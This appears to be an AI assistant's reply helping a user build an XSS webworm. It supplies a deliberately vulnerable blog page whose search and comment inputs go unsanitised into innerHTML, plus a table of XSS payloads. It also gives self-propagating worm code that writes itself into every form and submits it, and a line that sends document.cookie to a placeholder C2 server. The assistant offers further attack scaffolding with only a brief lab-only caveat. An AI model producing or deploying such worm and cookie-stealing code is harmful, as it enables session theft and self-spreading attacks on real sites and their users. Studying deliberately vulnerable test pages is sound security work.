Got it. You need a more **realistic webpage**—something richer with elements like images, forms, buttons, maybe dynamic content—to simulate an environment where your XSS webworm can interact, spread, and potentially manipulate more DOM vectors.

Here's a **semi-realistic vulnerable HTML page** with:

* **Multiple DOM elements** (images, inputs, buttons, links)
* **A vulnerable search bar** (reflected XSS)
* **Image tags** and **event-driven content**
* **A comment section** (persistent-style simulation)
* **Use of `.innerHTML` and `.src` — multiple XSS injection vectors**

---

### 💻 **Enhanced XSS Test Page (Save as `advanced_xss_test.html`)**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>MyBlog - XSS Test Page</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .comment { border-bottom: 1px solid #ccc; margin-top: 10px; padding: 10px; }
        img { max-width: 300px; }
    </style>
</head>
<body>
    <h1>Welcome to MyBlog</h1>

    <nav>
        <a href="#">Home</a> |
        <a href="#">Articles</a> |
        <a href="#">About</a>
    </nav>

    <section>
        <h2>Photo of the Day</h2>
        <img id="dailyImage" src="https://placekitten.com/400/300" alt="Cute Kitten">
        <p id="imageCaption">Look at this cute kitten!</p>
    </section>

    <section>
        <h2>Search the Blog</h2>
        <form method="GET">
            <input type="text" name="query" placeholder="Search..." />
            <button type="submit">Search</button>
        </form>
        <div id="searchResults"></div>
    </section>

    <section>
        <h2>Leave a Comment</h2>
        <form id="commentForm">
            <input type="text" id="username" placeholder="Your name" required />
            <br><br>
            <textarea id="commentText" placeholder="Your comment" rows="4" cols="50" required></textarea>
            <br><br>
            <button type="submit">Post Comment</button>
        </form>
        <div id="commentsSection">
            <h3>Comments</h3>
        </div>
    </section>

    <footer>
        <p>&copy; 2025 MyBlog. All rights reserved.</p>
    </footer>

    <script>
        // Reflected XSS in search
        const params = new URLSearchParams(window.location.search);
        const searchQuery = params.get("query");
        if (searchQuery) {
            document.getElementById("searchResults").innerHTML =
                `<p>Search results for: <strong>${searchQuery}</strong></p>`;
        }

        // Simulated Persistent XSS via comment form
        document.getElementById("commentForm").addEventListener("submit", function (e) {
            e.preventDefault();
            const username = document.getElementById("username").value;
            const comment = document.getElementById("commentText").value;

            const commentHTML = `
                <div class="comment">
                    <strong>${username}</strong><br>
                    <p>${comment}</p>
                </div>
            `;
            document.getElementById("commentsSection").innerHTML += commentHTML;
        });
    </script>
</body>
</html>
```

---

### 🎯 Injection Points for XSS Worms

| Target                             | Vector                             | Payload Example                             |
| ---------------------------------- | ---------------------------------- | ------------------------------------------- |
| `searchQuery`                      | Reflected XSS                      | `?query=<img src=x onerror="alert('xss')">` |
| `commentText`                      | Persistent XSS Simulation          | `<script>yourWorm()</script>`               |
| `imageCaption` or `dailyImage.src` | DOM injection (image manipulation) | via injected script                         |

---

### 🧪 Tips for Worm Testing

You can simulate self-propagating behavior like this:

```javascript
(function spread() {
    // Harvest all forms on the page
    document.querySelectorAll('form').forEach(form => {
        let input = form.querySelector('input, textarea');
        if (input) {
            input.value = `<script>(${spread.toString()})()</script>`;
            form.submit();
        }
    });
})();
```

Or log to a fake C2 server:

```javascript
fetch('http://yourserver/c2?cookie=' + document.cookie);
```

---

### 🛡️ Final Note

This page **must only be used in a safe lab or local VM**, like:

* Kali Linux / Parrot in VirtualBox
* Docker container (e.g., with Apache or nginx)
* Local webserver (`python3 -m http.server` or `live-server`)

If you want a **real web app vulnerable to XSS**, look into:

* [DVWA (Damn Vulnerable Web Application)](http://www.dvwa.co.uk/)
* [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)

Would you like me to add DOM-based XSS vectors or simulate a vulnerable CMS-style admin panel too?
